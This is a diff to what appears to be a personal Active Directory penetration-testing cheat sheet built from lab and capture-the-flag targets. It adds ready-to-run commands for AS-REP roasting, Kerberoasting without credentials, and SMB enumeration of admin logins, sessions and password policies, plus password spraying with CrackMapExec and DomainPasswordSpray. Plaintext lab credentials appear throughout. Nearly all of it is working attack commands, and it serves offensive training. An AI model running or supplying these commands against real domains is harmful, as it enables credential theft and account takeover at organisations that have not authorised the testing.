@@ -77,6 +77,20 @@
 		sudo mv krb5.conf /etc/krb5.conf
 		
   		(asreproasting)	nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
+
+		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'
+		.\Rubeus.exe asreproast /user:carole.rose /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
+  		-----Kerberoasting without credentials
+
+  		python3 -m venv impacket-fork
+		source ./impacket-fork/bin/activate
+		git clone https://github.com/ThePorgs/impacket.git
+		cd impacket
+		python3 setup.py install
+
+		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231
+
+		
 		(керберостинг с nxc) nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
 		# Перечисление учетных записей с привилегиями gMSA
 		nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties 
@@ -283,6 +297,28 @@
         nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES" 
 
         nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
+
+		* local admin
+  
+		crackmapexec smb 192.168.50.110 -u 'Administrator' -p 'Password321' --local-auth 
+
+# Users auth on host
+
+  		sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+  
+# Password policies
+   
+		crackmapexec smb 192.168.50.110 -u 'albertina.albertina' -p animal --pass-pol 
+# Password Spray
+
+  		crackmapexec smb 192.168.50.110 -u users.txt -p passwords.txt --continue-on-success
+
+  		(in windows)
+  		https://github.com/dafthack/DomainPasswordSpray
+
+  		Import-Module .\DomainPasswordSpray.ps1
+		Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+  
 	
 # clock sync
 
